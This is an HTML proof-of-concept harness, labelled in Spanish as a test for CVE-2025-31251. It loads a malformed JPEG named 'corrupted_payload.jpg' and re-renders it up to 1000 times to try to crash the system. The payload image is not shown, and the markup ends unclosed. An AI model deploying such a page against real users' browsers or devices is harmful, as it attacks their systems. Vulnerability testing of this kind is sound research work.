<!DOCTYPE html>
<html>
<head>

<body>
  <h2>🖼️ CVE-2025-31251 - JPEG Malformed Exploit Test</h2>
  <div id="log">[+] Cargando imagen corrupta...</div>

  <img id="evilImg" src="corrupted_payload.jpg" alt="Exploit" />

  <script>
    const log = msg => {
      document.getElementById("log").textContent += "\n" + msg;
      console.log(msg);
    };

    const img = document.getElementById("evilImg");

    img.onload = () => {
      log("[+] Imagen cargada exitosamente. Observa si el sistema se comporta anormalmente.");
    };

    img.onerror = () => {
      log("[!] Error al cargar la imagen. Puede haber sido bloqueada por mitigaciones o causado un crash.");
    };

    // Forzar múltiples cargas para intentar provocar crash
    let attempts = 0;
    function spamRender() {
      img.src = "corrupted_payload.jpg?x=" + Math.random();
      attempts++;
      if (attempts < 1000) {
        setTimeout(spamRender, 20);
      } else {
        log("[+] Finalizó ciclo de render forzado.");
      }
    }

    setTimeout(spamRender, 1000);
